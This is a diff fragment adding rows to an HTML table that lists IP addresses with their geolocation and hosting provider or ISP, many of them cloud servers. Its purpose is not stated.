+<td>Haidian</td>
+<td>Beijing</td>
+<td>Shenzhen Tencent Computer Systems Company Limited</td>
+<td>Tencent Cloud Computing (Beijing) Co., Ltd</td>
+</tr>
+<tr>
+<td>165.232.178.225</td>
+<td>India</td>
+<td>Bengaluru</td>
+<td>Karnataka</td>
+<td>DigitalOcean, LLC</td>
+<td>DigitalOcean, LLC</td>
+</tr>
+<tr>
+<td>103.189.234.253</td>
+<td>Singapore</td>
+<td>Singapore</td>
+<td>Central Singapore</td>
+<td>Cloud Host Pte Ltd</td>
+<td>Cloud Host Pte Ltd</td>
+</tr>
+<tr>
+<td>37.187.103.145</td>
+<td>France</td>
+<td>Roubaix</td>
+<td>Hauts-de-France</td>
+<td>OVH SAS</td>
+<td>OVH SAS</td>
+</tr>
+<tr>
+<td>177.197.234.249</td>
+<td>Brazil</td>
+<td>São José dos Campos</td>
+<td>São Paulo</td>
+<td>Vivo</td>
+<td>TELEF�NICA BRASIL S.A</td>
+</tr>
+<tr>
+<td>220.196.192.67</td>
+<td>China</td>
+<td>Shanghai</td>
+<td>Shanghai</td>
+<td>China Unicom Network</td>
+<td>Unknown</td>
+</tr>
+<tr>
+<td>196.188.248.179</td>
+<td>Ethiopia</td>
+<td>Addis Ababa</td>
+<td>Addis Ababa</td>
+<td>Ethiotelecom</td>
+<td>Unknown</td>
+</tr>
+<tr>
+<td>103.53.166.226</td>
+<td>India</td>
+<td>Bengaluru</td>
+<td>Karnataka</td>
+<td>CCS Broadband 53166 SURAT</td>
+<td>Ishan Netsol Pvt Ltd</td>
+</tr>
+<tr>
+<td>190.181.4.12</td>
+<td>Bolivia</td>
+<td>La Paz</td>
+<td>La Paz Department</td>
+<td>AXS Bolivia S. A</td>
+<td>Bios System SRL</td>
+</tr>
+<tr>
+<td>85.245.107.230</td>
+<td>Portugal</td>
+<td>Lisbon</td>
+<td>Lisbon</td>
+<td>PT Comunicacoes S.A.</td>
+<td>PT Comunicacoes S.A.</td>
+</tr>
+<tr>
+<td>36.99.44.86</td>
+<td>China</td>
+<td>Zhengzhou</td>
+<td>Henan</td>
+<td>China Telecom</td>
+<td>Chinanet HA</td>
+</tr>
+<tr>
+<td>135.125.107.75</td>
+<td>France</td>
+<td>Paris</td>
+<td>Île-de-France</td>
+<td>OVH SAS</td>
+<td>OVH</td>
+</tr>
+<tr>
+<td>164.92.157.100</td>
+<td>The Netherlands</td>
+<td>Amsterdam</td>
+<td>North Holland</td>
+<td>DigitalOcean, LLC</td>
+<td>DigitalOcean, LLC</td>
+</tr>
+<tr>
+<td>41.223.124.122</td>
+<td>Mozambique</td>
+<td>Maputo</td>
+<td>Cidade de Maputo</td>
+<td>NextNet Network</td>
+<td>Unknown</td>
+</tr>
+<tr>
+<td>220.86.29.35</td>
+<td>South Korea</td>
+<td>Gangseo-gu</td>
+<td>Seoul</td>
+<td>Korea Telecom</td>
+<td>Korea Telecom</td>
+</tr>
+<tr>
+<td>120.70.96.30</td>
+<td>China</td>
+<td>Xingfulu</td>
+<td>Xinjiang</td>
+<td>CHINATELECOM Xinjiang Wulumuqi MAN network</td>
+<td>Chinanet XJ</td>
+</tr>
+<tr>
+<td>122.154.48.30</td>
+<td>Thailand</td>
+<td>Hat Yai</td>
+<td>Songkhla</td>
+<td>CAT Telecom Public Company Limited</td>
+<td>National Telecom Public Company Limited</td>
+</tr>
+<tr>
+<td>54.37.73.222</td>
+<td>Germany</td>
+<td>Saarbrücken</td>
+<td>Saarland</td>
+<td>OVH SAS</td>
+<td>OVH GmbH</td>
+</tr>
+<tr>
+<td>103.171.85.22</td>
+<td>Indonesia</td>
+<td>Cicurug</td>
+<td>West Java</td>
+<td>PT Cloud Hosting Indonesia</td>
+<td>PT Cloud Hosting Indonesia</td>
+</tr>
+<tr>
+<td>49.64.169.153</td>
+<td>China</td>
+<td>Nanjing</td>
+<td>Jiangsu</td>
+<td>Chinanet</td>
+<td>Chinanet JS</td>
+</tr>
+<tr>
+<td>90.239.30.219</td>
+<td>Sweden</td>
+<td>Stockholm</td>
+<td>Stockholm County</td>
+<td>Telia Company AB</td>
+<td>Telia Network Services</td>
+</tr>
+<tr>
+<td>134.209.150.62</td>
+<td>India</td>
+<td>Bengaluru</td>
+<td>Karnataka</td>
+<td>DigitalOcean, LLC</td>
+<td>DigitalOcean, LLC</td>
+</tr>
+<tr>
+<td>15.235.199.158</td>
+<td>Singapore</td>
+<td>Singapore</td>
+<td>Central Singapore</td>
+<td>OVH SAS</td>
+<td>OVH Singapore PTE. LTD</td>
+</tr>
+<tr>
+<td>197.243.14.52</td>
+<td>Rwanda</td>
+<td>Kigali</td>
+<td>Kigali</td>
+<td>BSC</td>
+<td>Unknown</td>
+</tr>
+<tr>
+<td>103.98.176.140</td>
+<td>Indonesia</td>
+<td>Rejosari</td>
+<td>Central Java</td>
+<td>Universitas PGRI Semarang</td>
+<td>Universitas PGRI Semarang</td>
+</tr>
+<tr>
+<td>45.182.167.237</td>
+<td>Brazil</td>
+<td>Maripá de Minas</td>
+<td>Minas Gerais</td>
+<td>Fourlink Telecom Serviços de Telecomunicações Ltda</td>
+<td>Fourlink Telecom Serviços de Telecomunicações Ltda</td>
+</tr>
+<tr>
+<td>91.205.128.170</td>
+<td>Russia</td>
+<td>Makhachkala</td>
+<td>Dagestan</td>
+<td>LTD &quot;Erline&quot;</td>
+<td>R-Line Ltd</td>
+</tr>
+<tr>
+<td>144.34.212.238</td>
+<td>United States</td>
+<td>Los Angeles</td>
+<td>California</td>
+<td>IT7 Networks Inc</td>
+<td>Cluster Logic Inc</td>
+</tr>
+<tr>
+<td>125.124.74.56</td>
+<td>China</td>
+<td>Hangzhou</td>
+<td>Zhejiang</td>
+<td>Chinanet</td>
+<td>Unknown</td>
+</tr>
+<tr>
+<td>82.157.63.72</td>
+<td>China</td>
+<td>Beijing</td>
+<td>Beijing</td>
+<td>Shenzhen Tencent Computer Systems Company Limited</td>
+<td>Tencent Cloud Computing (Beijing) Co., Ltd</td>
+</tr>
+<tr>
+<td>159.223.45.100</td>
+<td>Singapore</td>
+<td>Singapore</td>
+<td>South West</td>
+<td>DigitalOcean, LLC</td>
+<td>DigitalOcean, LLC</td>
+</tr>
+<tr>
+<td>174.138.10.205</td>
+<td>The Netherlands</td>
+<td>Amsterdam</td>
+<td>North Holland</td>
+<td>DigitalOcean, LLC</td>
+<td>DigitalOcean, LLC</td>
+</tr>
+<tr>
+<td>27.128.174.164</td>
+<td>China</td>
+<td>Shijiazhuang</td>
+<td>Hebei</td>
+<td>Chinanet</td>
+<td>Chinanet HE</td>
+</tr>
+<tr>
+<td>180.148.213.132</td>
+<td>Bangladesh</td>
+<td>Dhaka</td>
+<td>Dhaka Division</td>
+<td>STARGATE</td>
+<td>Stargate Communications Ltd.</td>
+</tr>
+<tr>
+<td>122.34.166.68</td>
+<td>South Korea</td>
+<td>Yuseong-gu</td>
+<td>Daejeon</td>
+<td>LG POWERCOMM</td>
+<td>Xpeed</td>
+</tr>
+<tr>
+<td>35.241.84.62</td>
+<td>Hong Kong</td>
+<td>Hong Kong</td>
+<td>Central and Western District</td>
+<td>Google LLC</td>
+<td>Google Cloud (asia-east2)</td>
+</tr>
+<tr>
+<td>36.46.159.244</td>
+<td>China</td>
+<td>Xincheng</td>
+<td>Shaanxi</td>
+<td>CHINANET SHAANXI province Cloud Base network</td>
+<td>Chinanet SN</td>
+</tr>
+<tr>
+<td>49.36.43.178</td>
+<td>India</td>
+<td>Nagpur</td>
+<td>Maharashtra</td>
+<td>Reliance Jio Infocomm Limited</td>
+<td>Reliance Jio Infocomm Limited</td>
+</tr>
+<tr>
+<td>102.214.168.132</td>
+<td>Somalia</td>
+<td>Mogadishu</td>
+<td>Banaadir</td>
+<td>Somtel Somalia LTD</td>
+<td>Somtel Somalia LTD</td>
+</tr>
+<tr>
+<td>167.172.157.140</td>
+<td>United States</td>
+<td>North Bergen</td>
+<td>New Jersey</td>
+<td>DigitalOcean, LLC</td>
+<td>DigitalOcean, LLC</td>
+</tr>
+<tr>
+<td>114.219.56.217</td>
+<td>China</td>
+<td>Nanjing</td>
+<td>Jiangsu</td>
+<td>Chinanet</td>
+<td>Chinanet JS</td>
+</tr>
+<tr>
+<td>187.110.238.50</td>
+<td>Brazil</td>
+<td>Fortaleza</td>
+<td>Ceará</td>
+<td>DB3 SERVICOS DE TELECOMUNICACOES S.A</td>
+<td>DB3 SERVICOS DE TELECOMUNICACOES S.A</td>
+</tr>
+<tr>
+<td>103.130.215.82</td>
+<td>Vietnam</td>
+<td>Hanoi</td>
+<td>Hanoi</td>
+<td>P815</td>
+<td>Unknown</td>
+</tr>
+<tr>
+<td>45.117.32.230</td>
+<td>Mongolia</td>
+<td>Ulan Bator</td>
+<td>Ulaanbaatar Hot</td>
+<td>Mobinet LLC</td>
+<td>Unknown</td>
+</tr>
+<tr>
+<td>43.134.34.122</td>
+<td>Singapore</td>
+<td>Singapore</td>
+<td>North West</td>
+<td>Shenzhen Tencent Computer Systems Company Limited</td>
+<td>Tencent Cloud Computing</td>
+</tr>
+<tr>
+<td>113.161.252.70</td>
+<td>Vietnam</td>
+<td>Ho Chi Minh City</td>
+<td>Ho Chi Minh</td>
+<td>VietNam Post and Telecom Corporation</td>
+<td>Vietnam Posts and Telecommunications Group</td>
+</tr>
+<tr>
+<td>149.78.186.161</td>
+<td>Brazil</td>
+<td>Barueri</td>
+<td>São Paulo</td>
+<td>Qnax Ltda</td>
+<td>Qnax Ltda</td>
+</tr>
+<tr>
+<td>193.95.30.6</td>
+<td>Tunisia</td>
+<td>Tunis</td>
+<td>Tunis Governorate</td>
+<td>CCK</td>
+<td>ATI - Agence Tunisienne Internet</td>
+</tr>
+<tr>
+<td>52.172.162.64</td>
+<td>India</td>
+<td>Pune</td>
+<td>Maharashtra</td>
+<td>Microsoft Corporation</td>
+<td>Microsoft Azure Cloud (centralindia)</td>
+</tr>
+<tr>
+<td>142.93.51.142</td>
+<td>United States</td>
+<td>North Bergen</td>
+<td>New Jersey</td>
+<td>DigitalOcean, LLC</td>
+<td>DigitalOcean, LLC</td>
+</tr>
+<tr>
+<td>118.43.95.157</td>
+<td>South Korea</td>
+<td>Gimje-si</td>
+<td>Jeollabuk-do</td>
+<td>Korea Telecom</td>
+<td>Kornet</td>
+</tr>
+<tr>
+<td>152.42.160.220</td>
+<td>Singapore</td>
+<td>Singapore</td>
+<td>South West</td>
+<td>DigitalOcean, LLC</td>
+<td>Digital Ocean</td>
+</tr>
+<tr>
+<td>134.122.114.194</td>
+<td>United States</td>
+<td>North Bergen</td>
+<td>New Jersey</td>
+<td>DigitalOcean, LLC</td>
+<td>DigitalOcean, LLC</td>
+</tr>
+</tbody></table>
